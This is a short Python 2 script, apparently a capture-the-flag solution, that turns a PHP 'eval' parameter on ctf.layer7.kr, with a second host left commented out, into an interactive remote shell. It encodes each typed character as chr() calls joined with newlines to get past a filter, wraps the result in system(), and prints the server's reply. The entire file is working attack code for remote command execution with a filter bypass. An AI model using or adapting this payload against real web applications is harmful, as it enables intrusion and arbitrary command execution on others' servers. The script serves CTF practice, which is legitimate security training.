import requests

while(1):
    n = raw_input("Input what you want eval : ")

    print("\n\n\n\n\n")
    
    url = "http://ctf.layer7.kr:6001/?eval=system%0A(%0A"
#    url = "http://kshgroup.kr/probs/filter.php?eval=system%0A(%0A"
    for i in range(len(n)):
        if i is not 0:
            url += "."
        url += "chr(%0A" + str(ord(n[i])) + ")"

    url += "%0A);"

    r = requests.get(url)
    print("This is result : ")
    print(r.text)
    print("\n\n\n\n\n")
